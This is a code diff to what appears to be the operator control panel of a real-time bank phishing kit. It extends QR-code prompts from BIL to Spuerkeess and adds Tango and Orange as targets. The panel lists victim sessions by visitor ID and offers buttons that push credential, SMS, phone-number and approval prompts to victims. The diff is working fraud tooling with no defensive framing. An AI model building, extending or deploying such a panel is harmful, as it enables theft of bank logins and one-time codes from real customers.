@@ -193,7 +193,9 @@ function MiniLogo({ slug, name }) {
 
 const ACTIONS = [
   { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white", banks: null },
-  { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil"] },
+  { key: "ask_qr", label: "QR vragen", style: "bg-fuchsia-700 text-white", banks: ["bil", "spuerkeess"] },
+  { key: "ask_tango", label: "Tango vragen", style: "bg-slate-700 text-white", banks: null },
+  { key: "ask_orange", label: "Orange vragen", style: "bg-orange-500 text-white", banks: null },
   { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white", banks: null },
   { key: "ask_phone", label: "Telefoon vragen", style: "bg-cyan-700 text-white", banks: null },
   { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white", banks: null },
@@ -1394,7 +1396,7 @@ function blobToDataURL(blob) {
 // BIL-only: upload the session QR (Cloudinary, inline fallback).
 // One image per session: uploading replaces (and deletes) the old one.
 // Shows: not-uploaded / uploading % / uploaded / failed.
-function QrUploadCard({ visitorId }) {
+function QrUploadCard({ visitorId, bankName }) {
   const [current, setCurrent] = useState(null);
   const [file, setFile] = useState(null);
   const [cropBlob, setCropBlob] = useState(null);
@@ -1562,7 +1564,7 @@ function QrUploadCard({ visitorId }) {
 
   return (
     <div className="rounded-xl bg-white/[0.04] p-3 ring-1 ring-fuchsia-400/20">
-      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">QR tonen (BIL)</h4>
+      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">QR tonen ({bankName || "bank"})</h4>
       {current?.image ? (
         <img src={current.image} alt="QR" className="mx-auto mt-2 h-28 w-28 rounded-lg bg-white object-contain p-1" />
       ) : (
@@ -1682,18 +1684,13 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
         {/* RIGHT — ask-step buttons */}
         <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
           <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Actions</h3>
-          {v.bank === "bil" && (
+          {(v.bank === "bil" || v.bank === "spuerkeess") && (
             <div className="mt-2.5">
-              <QrUploadCard visitorId={v.id} />
+              <QrUploadCard visitorId={v.id} bankName={v.bankName || v.bank} />
             </div>
           )}
           <div className="mt-2.5 grid grid-cols-2 gap-1.5 lg:grid-cols-1">
-            {ACTIONS.filter((a) => {
-              if (a.banks && !a.banks.includes(v.bank)) return false;
-              // Tango / Orange are login-only: just re-ask login or park on loader.
-              if ((v.bank === "tango" || v.bank === "orange") && !["ask_login", "reset_waiting"].includes(a.key)) return false;
-              return true;
-            }).map((a) => (
+            {ACTIONS.filter((a) => !a.banks || a.banks.includes(v.bank)).map((a) => (
               <button
                 key={a.key}
                 onClick={() => onAction(a.key)}
